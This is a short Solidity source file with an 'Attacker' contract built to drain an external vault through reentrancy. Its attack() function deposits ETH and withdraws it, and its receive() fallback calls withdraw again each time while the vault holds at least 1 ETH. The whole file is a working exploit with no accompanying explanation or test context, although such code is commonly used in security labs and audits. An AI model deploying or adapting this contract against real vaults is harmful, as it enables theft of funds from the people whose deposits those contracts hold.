// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface AttackVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attacker {
    AttackVault public vault;

    constructor(address _vault) {
        vault = AttackVault(_vault);
    }
    

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }
}